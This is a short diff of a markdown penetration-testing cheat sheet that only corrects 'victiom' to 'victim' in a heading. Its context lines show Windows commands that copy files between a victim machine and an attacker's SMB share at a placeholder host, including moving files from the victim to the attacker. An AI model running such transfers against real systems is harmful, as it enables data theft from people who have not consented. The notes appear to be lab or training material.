@@ -32,7 +32,7 @@ net use u: /d
 copy \\<lhost>\kali\<some-file> C:\PrivEsc\<some-file>
 ```
 
-## move files from victiom to attacker via smb share
+## move files from victim to attacker via smb share
 
 ```cmd
 copy C:\PrivEsc\<some-file> \\<lhost>\kali\<some-file>
